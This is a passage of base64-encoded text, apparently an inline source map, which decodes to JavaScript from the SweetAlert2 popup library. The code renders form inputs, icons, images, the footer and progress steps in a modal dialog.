tcblxuICAvKipcbiAgICogQHBhcmFtIHtIVE1MSW5wdXRFbGVtZW50fSByYW5nZVxuICAgKiBAcGFyYW0ge1N3ZWV0QWxlcnRPcHRpb25zfSBwYXJhbXNcbiAgICogQHJldHVybnMge0hUTUxJbnB1dEVsZW1lbnR9XG4gICAqL1xuICByZW5kZXJJbnB1dFR5cGUucmFuZ2UgPSAocmFuZ2UsIHBhcmFtcykgPT4ge1xuICAgIGNvbnN0IHJhbmdlSW5wdXQgPSByYW5nZS5xdWVyeVNlbGVjdG9yKCdpbnB1dCcpO1xuICAgIGNvbnN0IHJhbmdlT3V0cHV0ID0gcmFuZ2UucXVlcnlTZWxlY3Rvcignb3V0cHV0Jyk7XG4gICAgY2hlY2tBbmRTZXRJbnB1dFZhbHVlKHJhbmdlSW5wdXQsIHBhcmFtcy5pbnB1dFZhbHVlKTtcbiAgICByYW5nZUlucHV0LnR5cGUgPSBwYXJhbXMuaW5wdXQ7XG4gICAgY2hlY2tBbmRTZXRJbnB1dFZhbHVlKHJhbmdlT3V0cHV0LCBwYXJhbXMuaW5wdXRWYWx1ZSk7XG4gICAgc2V0SW5wdXRMYWJlbChyYW5nZUlucHV0LCByYW5nZSwgcGFyYW1zKTtcbiAgICByZXR1cm4gcmFuZ2U7XG4gIH07XG5cbiAgLyoqXG4gICAqIEBwYXJhbSB7SFRNTFNlbGVjdEVsZW1lbnR9IHNlbGVjdFxuICAgKiBAcGFyYW0ge1N3ZWV0QWxlcnRPcHRpb25zfSBwYXJhbXNcbiAgICogQHJldHVybnMge0hUTUxTZWxlY3RFbGVtZW50fVxuICAgKi9cbiAgcmVuZGVySW5wdXRUeXBlLnNlbGVjdCA9IChzZWxlY3QsIHBhcmFtcykgPT4ge1xuICAgIHNlbGVjdC50ZXh0Q29udGVudCA9ICcnO1xuICAgIGlmIChwYXJhbXMuaW5wdXRQbGFjZWhvbGRlcikge1xuICAgICAgY29uc3QgcGxhY2Vob2xkZXIgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdvcHRpb24nKTtcbiAgICAgIHNldElubmVySHRtbChwbGFjZWhvbGRlciwgcGFyYW1zLmlucHV0UGxhY2Vob2xkZXIpO1xuICAgICAgcGxhY2Vob2xkZXIudmFsdWUgPSAnJztcbiAgICAgIHBsYWNlaG9sZGVyLmRpc2FibGVkID0gdHJ1ZTtcbiAgICAgIHBsYWNlaG9sZGVyLnNlbGVjdGVkID0gdHJ1ZTtcbiAgICAgIHNlbGVjdC5hcHBlbmRDaGlsZChwbGFjZWhvbGRlcik7XG4gICAgfVxuICAgIHNldElucHV0TGFiZWwoc2VsZWN0LCBzZWxlY3QsIHBhcmFtcyk7XG4gICAgcmV0dXJuIHNlbGVjdDtcbiAgfTtcblxuICAvKipcbiAgICogQHBhcmFtIHtIVE1MSW5wdXRFbGVtZW50fSByYWRpb1xuICAgKiBAcmV0dXJucyB7SFRNTElucHV0RWxlbWVudH1cbiAgICovXG4gIHJlbmRlcklucHV0VHlwZS5yYWRpbyA9IHJhZGlvID0+IHtcbiAgICByYWRpby50ZXh0Q29udGVudCA9ICcnO1xuICAgIHJldHVybiByYWRpbztcbiAgfTtcblxuICAvKipcbiAgICogQHBhcmFtIHtIVE1MTGFiZWxFbGVtZW50fSBjaGVja2JveENvbnRhaW5lclxuICAgKiBAcGFyYW0ge1N3ZWV0QWxlcnRPcHRpb25zfSBwYXJhbXNcbiAgICogQHJldHVybnMge0hUTUxJbnB1dEVsZW1lbnR9XG4gICAqL1xuICByZW5kZXJJbnB1dFR5cGUuY2hlY2tib3ggPSAoY2hlY2tib3hDb250YWluZXIsIHBhcmFtcykgPT4ge1xuICAgIGNvbnN0IGNoZWNrYm94ID0gZ2V0SW5wdXQkMShnZXRQb3B1cCgpLCAnY2hlY2tib3gnKTtcbiAgICBjaGVja2JveC52YWx1ZSA9ICcxJztcbiAgICBjaGVja2JveC5pZCA9IHN3YWxDbGFzc2VzLmNoZWNrYm94O1xuICAgIGNoZWNrYm94LmNoZWNrZWQgPSBCb29sZWFuKHBhcmFtcy5pbnB1dFZhbHVlKTtcbiAgICBjb25zdCBsYWJlbCA9IGNoZWNrYm94Q29udGFpbmVyLnF1ZXJ5U2VsZWN0b3IoJ3NwYW4nKTtcbiAgICBzZXRJbm5lckh0bWwobGFiZWwsIHBhcmFtcy5pbnB1dFBsYWNlaG9sZGVyKTtcbiAgICByZXR1cm4gY2hlY2tib3g7XG4gIH07XG5cbiAgLyoqXG4gICAqIEBwYXJhbSB7SFRNTFRleHRBcmVhRWxlbWVudH0gdGV4dGFyZWFcbiAgICogQHBhcmFtIHtTd2VldEFsZXJ0T3B0aW9uc30gcGFyYW1zXG4gICAqIEByZXR1cm5zIHtIVE1MVGV4dEFyZWFFbGVtZW50fVxuICAgKi9cbiAgcmVuZGVySW5wdXRUeXBlLnRleHRhcmVhID0gKHRleHRhcmVhLCBwYXJhbXMpID0+IHtcbiAgICBjaGVja0FuZFNldElucHV0VmFsdWUodGV4dGFyZWEsIHBhcmFtcy5pbnB1dFZhbHVlKTtcbiAgICBzZXRJbnB1dFBsYWNlaG9sZGVyKHRleHRhcmVhLCBwYXJhbXMpO1xuICAgIHNldElucHV0TGFiZWwodGV4dGFyZWEsIHRleHRhcmVhLCBwYXJhbXMpO1xuXG4gICAgLyoqXG4gICAgICogQHBhcmFtIHtIVE1MRWxlbWVudH0gZWxcbiAgICAgKiBAcmV0dXJucyB7bnVtYmVyfVxuICAgICAqL1xuICAgIGNvbnN0IGdldE1hcmdpbiA9IGVsID0+IHBhcnNlSW50KHdpbmRvdy5nZXRDb21wdXRlZFN0eWxlKGVsKS5tYXJnaW5MZWZ0KSArIHBhcnNlSW50KHdpbmRvdy5nZXRDb21wdXRlZFN0eWxlKGVsKS5tYXJnaW5SaWdodCk7XG5cbiAgICAvLyBodHRwczovL2dpdGh1Yi5jb20vc3dlZXRhbGVydDIvc3dlZXRhbGVydDIvaXNzdWVzLzIyOTFcbiAgICBzZXRUaW1lb3V0KCgpID0+IHtcbiAgICAgIC8vIGh0dHBzOi8vZ2l0aHViLmNvbS9zd2VldGFsZXJ0Mi9zd2VldGFsZXJ0Mi9pc3N1ZXMvMTY5OVxuICAgICAgaWYgKCdNdXRhdGlvbk9ic2VydmVyJyBpbiB3aW5kb3cpIHtcbiAgICAgICAgY29uc3QgaW5pdGlhbFBvcHVwV2lkdGggPSBwYXJzZUludCh3aW5kb3cuZ2V0Q29tcHV0ZWRTdHlsZShnZXRQb3B1cCgpKS53aWR0aCk7XG4gICAgICAgIGNvbnN0IHRleHRhcmVhUmVzaXplSGFuZGxlciA9ICgpID0+IHtcbiAgICAgICAgICBjb25zdCB0ZXh0YXJlYVdpZHRoID0gdGV4dGFyZWEub2Zmc2V0V2lkdGggKyBnZXRNYXJnaW4odGV4dGFyZWEpO1xuICAgICAgICAgIGlmICh0ZXh0YXJlYVdpZHRoID4gaW5pdGlhbFBvcHVwV2lkdGgpIHtcbiAgICAgICAgICAgIGdldFBvcHVwKCkuc3R5bGUud2lkdGggPSBgJHt0ZXh0YXJlYVdpZHRofXB4YDtcbiAgICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgZ2V0UG9wdXAoKS5zdHlsZS53aWR0aCA9IG51bGw7XG4gICAgICAgICAgfVxuICAgICAgICB9O1xuICAgICAgICBuZXcgTXV0YXRpb25PYnNlcnZlcih0ZXh0YXJlYVJlc2l6ZUhhbmRsZXIpLm9ic2VydmUodGV4dGFyZWEsIHtcbiAgICAgICAgICBhdHRyaWJ1dGVzOiB0cnVlLFxuICAgICAgICAgIGF0dHJpYnV0ZUZpbHRlcjogWydzdHlsZSddXG4gICAgICAgIH0pO1xuICAgICAgfVxuICAgIH0pO1xuICAgIHJldHVybiB0ZXh0YXJlYTtcbiAgfTtcblxuICAvKipcbiAgICogQHBhcmFtIHtTd2VldEFsZXJ0Mn0gaW5zdGFuY2VcbiAgICogQHBhcmFtIHtTd2VldEFsZXJ0T3B0aW9uc30gcGFyYW1zXG4gICAqL1xuICBjb25zdCByZW5kZXJDb250ZW50ID0gKGluc3RhbmNlLCBwYXJhbXMpID0+IHtcbiAgICBjb25zdCBodG1sQ29udGFpbmVyID0gZ2V0SHRtbENvbnRhaW5lcigpO1xuICAgIGFwcGx5Q3VzdG9tQ2xhc3MoaHRtbENvbnRhaW5lciwgcGFyYW1zLCAnaHRtbENvbnRhaW5lcicpO1xuXG4gICAgLy8gQ29udGVudCBhcyBIVE1MXG4gICAgaWYgKHBhcmFtcy5odG1sKSB7XG4gICAgICBwYXJzZUh0bWxUb0NvbnRhaW5lcihwYXJhbXMuaHRtbCwgaHRtbENvbnRhaW5lcik7XG4gICAgICBzaG93KGh0bWxDb250YWluZXIsICdibG9jaycpO1xuICAgIH1cblxuICAgIC8vIENvbnRlbnQgYXMgcGxhaW4gdGV4dFxuICAgIGVsc2UgaWYgKHBhcmFtcy50ZXh0KSB7XG4gICAgICBodG1sQ29udGFpbmVyLnRleHRDb250ZW50ID0gcGFyYW1zLnRleHQ7XG4gICAgICBzaG93KGh0bWxDb250YWluZXIsICdibG9jaycpO1xuICAgIH1cblxuICAgIC8vIE5vIGNvbnRlbnRcbiAgICBlbHNlIHtcbiAgICAgIGhpZGUoaHRtbENvbnRhaW5lcik7XG4gICAgfVxuICAgIHJlbmRlcklucHV0KGluc3RhbmNlLCBwYXJhbXMpO1xuICB9O1xuXG4gIC8qKlxuICAgKiBAcGFyYW0ge1N3ZWV0QWxlcnQyfSBpbnN0YW5jZVxuICAgKiBAcGFyYW0ge1N3ZWV0QWxlcnRPcHRpb25zfSBwYXJhbXNcbiAgICovXG4gIGNvbnN0IHJlbmRlckZvb3RlciA9IChpbnN0YW5jZSwgcGFyYW1zKSA9PiB7XG4gICAgY29uc3QgZm9vdGVyID0gZ2V0Rm9vdGVyKCk7XG4gICAgdG9nZ2xlKGZvb3RlciwgcGFyYW1zLmZvb3Rlcik7XG4gICAgaWYgKHBhcmFtcy5mb290ZXIpIHtcbiAgICAgIHBhcnNlSHRtbFRvQ29udGFpbmVyKHBhcmFtcy5mb290ZXIsIGZvb3Rlcik7XG4gICAgfVxuXG4gICAgLy8gQ3VzdG9tIGNsYXNzXG4gICAgYXBwbHlDdXN0b21DbGFzcyhmb290ZXIsIHBhcmFtcywgJ2Zvb3RlcicpO1xuICB9O1xuXG4gIC8qKlxuICAgKiBAcGFyYW0ge1N3ZWV0QWxlcnQyfSBpbnN0YW5jZVxuICAgKiBAcGFyYW0ge1N3ZWV0QWxlcnRPcHRpb25zfSBwYXJhbXNcbiAgICovXG4gIGNvbnN0IHJlbmRlckljb24gPSAoaW5zdGFuY2UsIHBhcmFtcykgPT4ge1xuICAgIGNvbnN0IGlubmVyUGFyYW1zID0gcHJpdmF0ZVByb3BzLmlubmVyUGFyYW1zLmdldChpbnN0YW5jZSk7XG4gICAgY29uc3QgaWNvbiA9IGdldEljb24oKTtcblxuICAgIC8vIGlmIHRoZSBnaXZlbiBpY29uIGFscmVhZHkgcmVuZGVyZWQsIGFwcGx5IHRoZSBzdHlsaW5nIHdpdGhvdXQgcmUtcmVuZGVyaW5nIHRoZSBpY29uXG4gICAgaWYgKGlubmVyUGFyYW1zICYmIHBhcmFtcy5pY29uID09PSBpbm5lclBhcmFtcy5pY29uKSB7XG4gICAgICAvLyBDdXN0b20gb3IgZGVmYXVsdCBjb250ZW50XG4gICAgICBzZXRDb250ZW50KGljb24sIHBhcmFtcyk7XG4gICAgICBhcHBseVN0eWxlcyhpY29uLCBwYXJhbXMpO1xuICAgICAgcmV0dXJuO1xuICAgIH1cbiAgICBpZiAoIXBhcmFtcy5pY29uICYmICFwYXJhbXMuaWNvbkh0bWwpIHtcbiAgICAgIGhpZGUoaWNvbik7XG4gICAgICByZXR1cm47XG4gICAgfVxuICAgIGlmIChwYXJhbXMuaWNvbiAmJiBPYmplY3Qua2V5cyhpY29uVHlwZXMpLmluZGV4T2YocGFyYW1zLmljb24pID09PSAtMSkge1xuICAgICAgZXJyb3IoYFVua25vd24gaWNvbiEgRXhwZWN0ZWQgXCJzdWNjZXNzXCIsIFwiZXJyb3JcIiwgXCJ3YXJuaW5nXCIsIFwiaW5mb1wiIG9yIFwicXVlc3Rpb25cIiwgZ290IFwiJHtwYXJhbXMuaWNvbn1cImApO1xuICAgICAgaGlkZShpY29uKTtcbiAgICAgIHJldHVybjtcbiAgICB9XG4gICAgc2hvdyhpY29uKTtcblxuICAgIC8vIEN1c3RvbSBvciBkZWZhdWx0IGNvbnRlbnRcbiAgICBzZXRDb250ZW50KGljb24sIHBhcmFtcyk7XG4gICAgYXBwbHlTdHlsZXMoaWNvbiwgcGFyYW1zKTtcblxuICAgIC8vIEFuaW1hdGUgaWNvblxuICAgIGFkZENsYXNzKGljb24sIHBhcmFtcy5zaG93Q2xhc3MuaWNvbik7XG4gIH07XG5cbiAgLyoqXG4gICAqIEBwYXJhbSB7SFRNTEVsZW1lbnR9IGljb25cbiAgICogQHBhcmFtIHtTd2VldEFsZXJ0T3B0aW9uc30gcGFyYW1zXG4gICAqL1xuICBjb25zdCBhcHBseVN0eWxlcyA9IChpY29uLCBwYXJhbXMpID0+IHtcbiAgICBmb3IgKGNvbnN0IGljb25UeXBlIGluIGljb25UeXBlcykge1xuICAgICAgaWYgKHBhcmFtcy5pY29uICE9PSBpY29uVHlwZSkge1xuICAgICAgICByZW1vdmVDbGFzcyhpY29uLCBpY29uVHlwZXNbaWNvblR5cGVdKTtcbiAgICAgIH1cbiAgICB9XG4gICAgYWRkQ2xhc3MoaWNvbiwgaWNvblR5cGVzW3BhcmFtcy5pY29uXSk7XG5cbiAgICAvLyBJY29uIGNvbG9yXG4gICAgc2V0Q29sb3IoaWNvbiwgcGFyYW1zKTtcblxuICAgIC8vIFN1Y2Nlc3MgaWNvbiBiYWNrZ3JvdW5kIGNvbG9yXG4gICAgYWRqdXN0U3VjY2Vzc0ljb25CYWNrZ3JvdW5kQ29sb3IoKTtcblxuICAgIC8vIEN1c3RvbSBjbGFzc1xuICAgIGFwcGx5Q3VzdG9tQ2xhc3MoaWNvbiwgcGFyYW1zLCAnaWNvbicpO1xuICB9O1xuXG4gIC8vIEFkanVzdCBzdWNjZXNzIGljb24gYmFja2dyb3VuZCBjb2xvciB0byBtYXRjaCB0aGUgcG9wdXAgYmFja2dyb3VuZCBjb2xvclxuICBjb25zdCBhZGp1c3RTdWNjZXNzSWNvbkJhY2tncm91bmRDb2xvciA9ICgpID0+IHtcbiAgICBjb25zdCBwb3B1cCA9IGdldFBvcHVwKCk7XG4gICAgY29uc3QgcG9wdXBCYWNrZ3JvdW5kQ29sb3IgPSB3aW5kb3cuZ2V0Q29tcHV0ZWRTdHlsZShwb3B1cCkuZ2V0UHJvcGVydHlWYWx1ZSgnYmFja2dyb3VuZC1jb2xvcicpO1xuICAgIC8qKiBAdHlwZSB7Tm9kZUxpc3RPZjxIVE1MRWxlbWVudD59ICovXG4gICAgY29uc3Qgc3VjY2Vzc0ljb25QYXJ0cyA9IHBvcHVwLnF1ZXJ5U2VsZWN0b3JBbGwoJ1tjbGFzc149c3dhbDItc3VjY2Vzcy1jaXJjdWxhci1saW5lXSwgLnN3YWwyLXN1Y2Nlc3MtZml4Jyk7XG4gICAgZm9yIChsZXQgaSA9IDA7IGkgPCBzdWNjZXNzSWNvblBhcnRzLmxlbmd0aDsgaSsrKSB7XG4gICAgICBzdWNjZXNzSWNvblBhcnRzW2ldLnN0eWxlLmJhY2tncm91bmRDb2xvciA9IHBvcHVwQmFja2dyb3VuZENvbG9yO1xuICAgIH1cbiAgfTtcbiAgY29uc3Qgc3VjY2Vzc0ljb25IdG1sID0gYFxuICA8ZGl2IGNsYXNzPVwic3dhbDItc3VjY2Vzcy1jaXJjdWxhci1saW5lLWxlZnRcIj48L2Rpdj5cbiAgPHNwYW4gY2xhc3M9XCJzd2FsMi1zdWNjZXNzLWxpbmUtdGlwXCI+PC9zcGFuPiA8c3BhbiBjbGFzcz1cInN3YWwyLXN1Y2Nlc3MtbGluZS1sb25nXCI+PC9zcGFuPlxuICA8ZGl2IGNsYXNzPVwic3dhbDItc3VjY2Vzcy1yaW5nXCI+PC9kaXY+IDxkaXYgY2xhc3M9XCJzd2FsMi1zdWNjZXNzLWZpeFwiPjwvZGl2PlxuICA8ZGl2IGNsYXNzPVwic3dhbDItc3VjY2Vzcy1jaXJjdWxhci1saW5lLXJpZ2h0XCI+PC9kaXY+XG5gO1xuICBjb25zdCBlcnJvckljb25IdG1sID0gYFxuICA8c3BhbiBjbGFzcz1cInN3YWwyLXgtbWFya1wiPlxuICAgIDxzcGFuIGNsYXNzPVwic3dhbDIteC1tYXJrLWxpbmUtbGVmdFwiPjwvc3Bhbj5cbiAgICA8c3BhbiBjbGFzcz1cInN3YWwyLXgtbWFyay1saW5lLXJpZ2h0XCI+PC9zcGFuPlxuICA8L3NwYW4+XG5gO1xuXG4gIC8qKlxuICAgKiBAcGFyYW0ge0hUTUxFbGVtZW50fSBpY29uXG4gICAqIEBwYXJhbSB7U3dlZXRBbGVydE9wdGlvbnN9IHBhcmFtc1xuICAgKi9cbiAgY29uc3Qgc2V0Q29udGVudCA9IChpY29uLCBwYXJhbXMpID0+IHtcbiAgICBsZXQgb2xkQ29udGVudCA9IGljb24uaW5uZXJIVE1MO1xuICAgIGxldCBuZXdDb250ZW50O1xuICAgIGlmIChwYXJhbXMuaWNvbkh0bWwpIHtcbiAgICAgIG5ld0NvbnRlbnQgPSBpY29uQ29udGVudChwYXJhbXMuaWNvbkh0bWwpO1xuICAgIH0gZWxzZSBpZiAocGFyYW1zLmljb24gPT09ICdzdWNjZXNzJykge1xuICAgICAgbmV3Q29udGVudCA9IHN1Y2Nlc3NJY29uSHRtbDtcbiAgICAgIG9sZENvbnRlbnQgPSBvbGRDb250ZW50LnJlcGxhY2UoLyBzdHlsZT1cIi4qP1wiL2csICcnKTsgLy8gdW5kbyBhZGp1c3RTdWNjZXNzSWNvbkJhY2tncm91bmRDb2xvcigpXG4gICAgfSBlbHNlIGlmIChwYXJhbXMuaWNvbiA9PT0gJ2Vycm9yJykge1xuICAgICAgbmV3Q29udGVudCA9IGVycm9ySWNvbkh0bWw7XG4gICAgfSBlbHNlIHtcbiAgICAgIGNvbnN0IGRlZmF1bHRJY29uSHRtbCA9IHtcbiAgICAgICAgcXVlc3Rpb246ICc/JyxcbiAgICAgICAgd2FybmluZzogJyEnLFxuICAgICAgICBpbmZvOiAnaSdcbiAgICAgIH07XG4gICAgICBuZXdDb250ZW50ID0gaWNvbkNvbnRlbnQoZGVmYXVsdEljb25IdG1sW3BhcmFtcy5pY29uXSk7XG4gICAgfVxuICAgIGlmIChvbGRDb250ZW50LnRyaW0oKSAhPT0gbmV3Q29udGVudC50cmltKCkpIHtcbiAgICAgIHNldElubmVySHRtbChpY29uLCBuZXdDb250ZW50KTtcbiAgICB9XG4gIH07XG5cbiAgLyoqXG4gICAqIEBwYXJhbSB7SFRNTEVsZW1lbnR9IGljb25cbiAgICogQHBhcmFtIHtTd2VldEFsZXJ0T3B0aW9uc30gcGFyYW1zXG4gICAqL1xuICBjb25zdCBzZXRDb2xvciA9IChpY29uLCBwYXJhbXMpID0+IHtcbiAgICBpZiAoIXBhcmFtcy5pY29uQ29sb3IpIHtcbiAgICAgIHJldHVybjtcbiAgICB9XG4gICAgaWNvbi5zdHlsZS5jb2xvciA9IHBhcmFtcy5pY29uQ29sb3I7XG4gICAgaWNvbi5zdHlsZS5ib3JkZXJDb2xvciA9IHBhcmFtcy5pY29uQ29sb3I7XG4gICAgZm9yIChjb25zdCBzZWwgb2YgWycuc3dhbDItc3VjY2Vzcy1saW5lLXRpcCcsICcuc3dhbDItc3VjY2Vzcy1saW5lLWxvbmcnLCAnLnN3YWwyLXgtbWFyay1saW5lLWxlZnQnLCAnLnN3YWwyLXgtbWFyay1saW5lLXJpZ2h0J10pIHtcbiAgICAgIHNldFN0eWxlKGljb24sIHNlbCwgJ2JhY2tncm91bmRDb2xvcicsIHBhcmFtcy5pY29uQ29sb3IpO1xuICAgIH1cbiAgICBzZXRTdHlsZShpY29uLCAnLnN3YWwyLXN1Y2Nlc3MtcmluZycsICdib3JkZXJDb2xvcicsIHBhcmFtcy5pY29uQ29sb3IpO1xuICB9O1xuXG4gIC8qKlxuICAgKiBAcGFyYW0ge3N0cmluZ30gY29udGVudFxuICAgKiBAcmV0dXJucyB7c3RyaW5nfVxuICAgKi9cbiAgY29uc3QgaWNvbkNvbnRlbnQgPSBjb250ZW50ID0+IGA8ZGl2IGNsYXNzPVwiJHtzd2FsQ2xhc3Nlc1snaWNvbi1jb250ZW50J119XCI+JHtjb250ZW50fTwvZGl2PmA7XG5cbiAgLyoqXG4gICAqIEBwYXJhbSB7U3dlZXRBbGVydDJ9IGluc3RhbmNlXG4gICAqIEBwYXJhbSB7U3dlZXRBbGVydE9wdGlvbnN9IHBhcmFtc1xuICAgKi9cbiAgY29uc3QgcmVuZGVySW1hZ2UgPSAoaW5zdGFuY2UsIHBhcmFtcykgPT4ge1xuICAgIGNvbnN0IGltYWdlID0gZ2V0SW1hZ2UoKTtcbiAgICBpZiAoIXBhcmFtcy5pbWFnZVVybCkge1xuICAgICAgaGlkZShpbWFnZSk7XG4gICAgICByZXR1cm47XG4gICAgfVxuICAgIHNob3coaW1hZ2UsICcnKTtcblxuICAgIC8vIFNyYywgYWx0XG4gICAgaW1hZ2Uuc2V0QXR0cmlidXRlKCdzcmMnLCBwYXJhbXMuaW1hZ2VVcmwpO1xuICAgIGltYWdlLnNldEF0dHJpYnV0ZSgnYWx0JywgcGFyYW1zLmltYWdlQWx0KTtcblxuICAgIC8vIFdpZHRoLCBoZWlnaHRcbiAgICBhcHBseU51bWVyaWNhbFN0eWxlKGltYWdlLCAnd2lkdGgnLCBwYXJhbXMuaW1hZ2VXaWR0aCk7XG4gICAgYXBwbHlOdW1lcmljYWxTdHlsZShpbWFnZSwgJ2hlaWdodCcsIHBhcmFtcy5pbWFnZUhlaWdodCk7XG5cbiAgICAvLyBDbGFzc1xuICAgIGltYWdlLmNsYXNzTmFtZSA9IHN3YWxDbGFzc2VzLmltYWdlO1xuICAgIGFwcGx5Q3VzdG9tQ2xhc3MoaW1hZ2UsIHBhcmFtcywgJ2ltYWdlJyk7XG4gIH07XG5cbiAgLyoqXG4gICAqIEBwYXJhbSB7U3dlZXRBbGVydDJ9IGluc3RhbmNlXG4gICAqIEBwYXJhbSB7U3dlZXRBbGVydE9wdGlvbnN9IHBhcmFtc1xuICAgKi9cbiAgY29uc3QgcmVuZGVyUG9wdXAgPSAoaW5zdGFuY2UsIHBhcmFtcykgPT4ge1xuICAgIGNvbnN0IGNvbnRhaW5lciA9IGdldENvbnRhaW5lcigpO1xuICAgIGNvbnN0IHBvcHVwID0gZ2V0UG9wdXAoKTtcblxuICAgIC8vIFdpZHRoXG4gICAgLy8gaHR0cHM6Ly9naXRodWIuY29tL3N3ZWV0YWxlcnQyL3N3ZWV0YWxlcnQyL2lzc3Vlcy8yMTcwXG4gICAgaWYgKHBhcmFtcy50b2FzdCkge1xuICAgICAgYXBwbHlOdW1lcmljYWxTdHlsZShjb250YWluZXIsICd3aWR0aCcsIHBhcmFtcy53aWR0aCk7XG4gICAgICBwb3B1cC5zdHlsZS53aWR0aCA9ICcxMDAlJztcbiAgICAgIHBvcHVwLmluc2VydEJlZm9yZShnZXRMb2FkZXIoKSwgZ2V0SWNvbigpKTtcbiAgICB9IGVsc2Uge1xuICAgICAgYXBwbHlOdW1lcmljYWxTdHlsZShwb3B1cCwgJ3dpZHRoJywgcGFyYW1zLndpZHRoKTtcbiAgICB9XG5cbiAgICAvLyBQYWRkaW5nXG4gICAgYXBwbHlOdW1lcmljYWxTdHlsZShwb3B1cCwgJ3BhZGRpbmcnLCBwYXJhbXMucGFkZGluZyk7XG5cbiAgICAvLyBDb2xvclxuICAgIGlmIChwYXJhbXMuY29sb3IpIHtcbiAgICAgIHBvcHVwLnN0eWxlLmNvbG9yID0gcGFyYW1zLmNvbG9yO1xuICAgIH1cblxuICAgIC8vIEJhY2tncm91bmRcbiAgICBpZiAocGFyYW1zLmJhY2tncm91bmQpIHtcbiAgICAgIHBvcHVwLnN0eWxlLmJhY2tncm91bmQgPSBwYXJhbXMuYmFja2dyb3VuZDtcbiAgICB9XG4gICAgaGlkZShnZXRWYWxpZGF0aW9uTWVzc2FnZSgpKTtcblxuICAgIC8vIENsYXNzZXNcbiAgICBhZGRDbGFzc2VzJDEocG9wdXAsIHBhcmFtcyk7XG4gIH07XG5cbiAgLyoqXG4gICAqIEBwYXJhbSB7SFRNTEVsZW1lbnR9IHBvcHVwXG4gICAqIEBwYXJhbSB7U3dlZXRBbGVydE9wdGlvbnN9IHBhcmFtc1xuICAgKi9cbiAgY29uc3QgYWRkQ2xhc3NlcyQxID0gKHBvcHVwLCBwYXJhbXMpID0+IHtcbiAgICAvLyBEZWZhdWx0IENsYXNzICsgc2hvd0NsYXNzIHdoZW4gdXBkYXRpbmcgU3dhbC51cGRhdGUoe30pXG4gICAgcG9wdXAuY2xhc3NOYW1lID0gYCR7c3dhbENsYXNzZXMucG9wdXB9ICR7aXNWaXNpYmxlJDEocG9wdXApID8gcGFyYW1zLnNob3dDbGFzcy5wb3B1cCA6ICcnfWA7XG4gICAgaWYgKHBhcmFtcy50b2FzdCkge1xuICAgICAgYWRkQ2xhc3MoW2RvY3VtZW50LmRvY3VtZW50RWxlbWVudCwgZG9jdW1lbnQuYm9keV0sIHN3YWxDbGFzc2VzWyd0b2FzdC1zaG93biddKTtcbiAgICAgIGFkZENsYXNzKHBvcHVwLCBzd2FsQ2xhc3Nlcy50b2FzdCk7XG4gICAgfSBlbHNlIHtcbiAgICAgIGFkZENsYXNzKHBvcHVwLCBzd2FsQ2xhc3Nlcy5tb2RhbCk7XG4gICAgfVxuXG4gICAgLy8gQ3VzdG9tIGNsYXNzXG4gICAgYXBwbHlDdXN0b21DbGFzcyhwb3B1cCwgcGFyYW1zLCAncG9wdXAnKTtcbiAgICBpZiAodHlwZW9mIHBhcmFtcy5jdXN0b21DbGFzcyA9PT0gJ3N0cmluZycpIHtcbiAgICAgIGFkZENsYXNzKHBvcHVwLCBwYXJhbXMuY3VzdG9tQ2xhc3MpO1xuICAgIH1cblxuICAgIC8vIEljb24gY2xhc3MgKCMxODQyKVxuICAgIGlmIChwYXJhbXMuaWNvbikge1xuICAgICAgYWRkQ2xhc3MocG9wdXAsIHN3YWxDbGFzc2VzW2BpY29uLSR7cGFyYW1zLmljb259YF0pO1xuICAgIH1cbiAgfTtcblxuICAvKipcbiAgICogQHBhcmFtIHtTd2VldEFsZXJ0Mn0gaW5zdGFuY2VcbiAgICogQHBhcmFtIHtTd2VldEFsZXJ0T3B0aW9uc30gcGFyYW1zXG4gICAqL1xuICBjb25zdCByZW5kZXJQcm9ncmVzc1N0ZXBzID0gKGluc3RhbmNlLCBwYXJhbXMpID0+IHtcbiAgICBjb25zdCBwcm9ncmVzc1N0ZXBzQ29udGFpbmVyID0gZ2V0UHJvZ3Jlc3NTdGVwcygpO1xuICAgIGlmICghcGFyYW1zLnByb2dyZXNzU3RlcHMgfHwgcGFyYW1zLnByb2dyZXNzU3RlcHMubGVuZ3RoID09PSAwKSB7XG4gICAgICBoaWRlKHByb2dyZXNzU3RlcHNDb250YWluZXIpO1xuICAgICAgcmV0dXJuO1xuICAgIH1cbiAgICBzaG93KHByb2dyZXNzU3RlcHNDb250YWluZXIpO1xuICAgIHByb2dyZXNzU3RlcHNDb250YWluZXIudGV4dENvbnRlbnQgPSAnJztcbiAgICBpZiAocGFyYW1zLmN1cnJlbnRQcm9ncmVzc1N0ZXAgPj0gcGFyYW1zLnByb2dyZXNzU3RlcHMubGVuZ3RoKSB7XG4gICAgICB3YXJuKCdJbnZhbGlkIGN1cnJlbnRQcm9ncmVzc1N0ZXAgcGFyYW1ldGVyLCBpdCBzaG91bGQgYmUgbGVzcyB0aGFuIHByb2dyZXNzU3RlcHMubGVuZ3RoICcgKyAnKGN1cnJlbnRQcm9ncmVzc1N0ZXAgbGlrZSBKUyBhcnJheXMgc3RhcnRzIGZyb20gMCknKTtcbiAgICB9XG4gICAgcGFyYW1zLnByb2dyZXNzU3RlcHMuZm9yRWFjaCgoc3RlcCwgaW5kZXgpID0+IHtcbiAgICAgIGNvbnN0IHN0ZXBFbCA9IGNyZWF0ZVN0ZXBFbGVtZW50KHN0ZXApO1xuICAgICAgcHJvZ3Jlc3NTdGVwc0NvbnRhaW5lci5hcHBlbmRDaGlsZChzdGVwRWwpO1xuICAgICAgaWYgKGluZGV4ID09PSBwYXJhbXMuY3VycmVudFByb2dyZXNzU3RlcCkge1xuICAgICAgICBhZGRDbGFzcyhzdGVwRWwsIHN3YWxDbGFzc2VzWydhY3RpdmUtcHJvZ3Jlc3Mtc3RlcCddKTtcbiAgICAgIH1cbiAgICAgIGlmIChpbmRleCAhPT0gcGFyYW1zLnByb2dyZXNzU3RlcHMubGVuZ3RoIC0gMSkge1xuICAgICAgICBjb25zdCBsaW5lRWwgPSBjcmVhdGVMaW5lRWxlbWVudChwYXJhbXMpO1xuICAgICAgICBwcm9ncmVzc1N0ZXBzQ29udGFpbmVyLmFwcGVuZENoaWxkKGxpbmVFbCk7XG4gICAgICB9XG4gICAgfSk7XG4gIH07XG5cbiAgLyoqXG4gICAqIEBwYXJhbSB7c3RyaW5nfSBzdGVwXG4gICAqIEByZXR1cm5zIHtIVE1MTElFbGVtZW50fVxuICAgKi9cbiAgY29uc3QgY3JlYXRlU3RlcEVsZW1lbnQgPSBzdGVwID0+IHtcbiAgICBjb25zdCBzdGVwRWwgPSBkb2